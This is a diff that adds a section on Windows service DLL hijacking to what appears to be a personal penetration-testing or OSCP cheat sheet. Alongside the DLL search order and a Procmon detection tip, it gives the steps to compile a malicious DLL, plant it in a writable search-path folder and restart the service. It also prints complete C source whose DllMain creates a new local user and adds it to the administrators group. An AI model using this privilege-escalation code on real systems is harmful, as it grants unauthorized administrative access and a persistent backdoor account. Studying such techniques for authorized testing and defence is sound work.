@@ -383,6 +383,53 @@ int main ()
 
 [Back to top](#index)
 
+### Service DLL Hijacking
+
+In this case steps are in order to hijack the DLL search order from a vulnerable service. Microsoft standard search order is:
+
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+To detect a service that tries to load missing DLL's Procmon from Sysinternals can be used. If this vulnerability is detected then:
+
+- Compile a malicious DLL with `x86_64-w64-mingw32-gcc maliciousDLLcode.cpp --shared -o myMaliciousDLL.dll`
+- Place the DLL (using the same name as the legitimate DLL thath the binary is trying to load) in any folder included in the DLL search order where the compromised user has writing permissions.
+- Restart the service with `Restart-Service <service_name> 
+
+*Malicious DLL example code*
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user escalateAsFck DontLookDown123! /add");
+            i = system ("net localgroup administrators escalateAsFck /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+[Back to top](#index)
+
 ## Port Scanning
 
 This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)
